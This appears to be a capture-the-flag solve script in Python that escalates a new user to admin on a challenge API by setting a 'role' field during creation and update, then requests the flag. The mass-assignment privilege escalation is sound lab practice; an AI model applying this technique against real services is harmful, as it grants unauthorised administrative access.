import json
import requests

# http://kashictf.iitbhucybersec.in:29209/docs

HOST = "http://kashictf.iitbhucybersec.in:29209"
username = "john"

url = f"{HOST}/create/{username}"

payload = json.dumps({
    "fname": "John",
    "lname": "Appleseed",
    "email": "john@apple.com",
    "gender": "male",
    "role": "admin"
})
headers = {
    'Content-Type': 'application/json'
}

response = requests.request("POST", url, headers=headers, data=payload)

print(response.text)

url = f"{HOST}/get/{username}"

payload = {}
headers = {}

response = requests.request("GET", url, headers=headers, data=payload)

print(response.text)

url = f"{HOST}/update/{username}"

payload = json.dumps({
    "role": "admin"
})
headers = {
    'Content-Type': 'application/json'
}

response = requests.request("PUT", url, headers=headers, data=payload)

print(response.text)

url = f"{HOST}/get/{username}"

payload = {}
headers = {}

response = requests.request("GET", url, headers=headers, data=payload)

print(response.text)

url = f"{HOST}/flag/{username}"

payload = ""
headers = {}

response = requests.request("GET", url, headers=headers, data=payload)

print(response.text)
